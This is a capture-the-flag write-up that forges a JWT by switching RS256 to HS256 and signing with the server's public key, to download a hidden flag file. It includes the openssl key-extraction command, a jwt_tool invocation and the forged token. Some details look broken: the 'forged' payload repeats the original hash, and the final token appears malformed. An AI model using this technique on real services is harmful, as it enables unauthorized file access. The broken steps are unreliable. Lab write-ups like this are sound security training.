#### Challenge:

During lift-off preparation, the main engine hydrogen burnoff system (MEHBS) activation fails. R-Boy gets stuck trying to restore an encrypted back-up of the MEHBS. Another crew member remembers the key is stored on a remote file sharing service. Without a working MEHBS the liftoff cannot continue. Can you help R-Boy find the key for the MEHBS back-up?

[https://gamebox3.reply.it:20443/download.php](https://gamebox3.reply.it:20443/download.php)

---

#### Solution:

- The link in the challenge leads to a site with two dummy files `future.jpg` and `future_license.txt` available to be downloaded. In source code, one can see that there are other files commented-out. Amongst them is `flag.txt`.

- Valid download link looks like this:

```
https://gamebox3.reply.it:20443/download.php?file=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJmaWxlbmFtZSI6IjdiNDIxZGYxMWE1M2UzM2Q5MjllZjRjMDI1Zjc5ZjgzIn0.dNHioi9RiEpyUtcOD6G5CBXU0EUi2HTl05eOvkFecmyoFyn5CWq5ExbwYLX8QE85qBaskOT-mtq3_XWwTxmGIKhPg8eOVuqqhU7nCg2eEdKwp-mjaPBnmDfBinvcfXEhItLi8T1hmMVgxaWSxQ1ZZKu4t-SFbuHOgesE6s9oBBiFMX92HSJbE3PnpAp6y6CYsI4hXBdzfAXERfmV0lV8-SRtKgKFwVTI-zmBlEGSReszw-NoDgGfFGF9e1tKjVb8sE3o5IYv5M5AmDjs8qWe5JO39IQeTJqn4r6Db6zPWjHKlheqFLrfytWQF9MvjDRU5CIu3tIRWYnylnVUA3Slrw
```

- The file parameter seems to be JWT token, after decoding it ([jwt.io](https://jwt.io)), we get:

```
{
    "typ": "JWT",
    "alg": "RS256"
}
{
    "filename": "7b421df11a53e33d929ef4c025f79f83"
}
```

- MD5 of the file name the link belongs to `MD5(future.jpg)` is:
```bash
7b421df11a53e33d929ef4c025f79f83
```

- So its clear now that we have to forge JWT token in download request to contain MD5 of `flag.txt` as filename:
```bash
{
    "typ": "JWT",
    "alg": "RS256"
}
{
    "filename": "7b421df11a53e33d929ef4c025f79f83"
}
```

- If vulnerable version of JWT is deployed on server, we can forge the request by changing the algorithm to `HS256` and use the public key as the encryption key. The slight hint here, was that this was the only challenge link that had HTTPS.

- The public key can be extracted from the challenge site with:
```bash
openssl s_client -connect gamebox3.reply.it:20443 | openssl x509 -pubkey -noout > public_key.pem
```

- Since we now have valid token, we have public key with which it was signed and we know the value we want to inject into the forged token, we use [jwt_tool](https://github.com/ticarpi/jwt_tool) to tamper with original request (change mode to HS256, change payload value to MD5 value of 'flag.txt' and sign the request with public_key.pem) to create forged request:

```bash
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJmaWxlbmFtZSI6IjdiNDIxZGYxMWE1M2UzM2Q5MjllZjRjMDI1Zjc5ZjgzIn0.dNHioi9RiEpyUtcOD6G5CBXU0EUi2HTl05eOvkFecmyoFyn5CWq5ExbwYLX8QE85qBaskOT-mtq3_XWwTxmGIKhPg8eOVuqqhU7nCg2eEdKwp-mjaPBnmDfBinvcfXEhItLi8T1hmMVgxaWSxQ1ZZKu4t-SFbuHOgesE6s9oBBiFMX92HSJbE3PnpAp6y6CYsI4hXBdzfAXERfmV0lV8-SRtKgKFwVTI-zmBlEGSReszw-NoDgGfFGF9e1tKjVb8sE3o5IYv5M5AmDjs8qWe5JO39IQeTJqn4r6Db6zPWjHKlheqFLrfytWQF9MvjDRU5CIu3tIRWYnylnVUA3Slrw
```

- Final forged request:
```
https://gamebox3.reply.it:20443/download.php?file=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlbmFtZSI6IjE1OWRmNDg4NzU2MjdlMmY3ZjY2ZGFlNTg0YzVlM2E1In04x95HPXGvC1mVYzsvIwc9YoDV8W9HiSscTA1_Gcxx7c
```

<details><summary>FLAG:</summary>

```
{FLG:n0_b4ckup_n0_m3rcy}
```

</details>
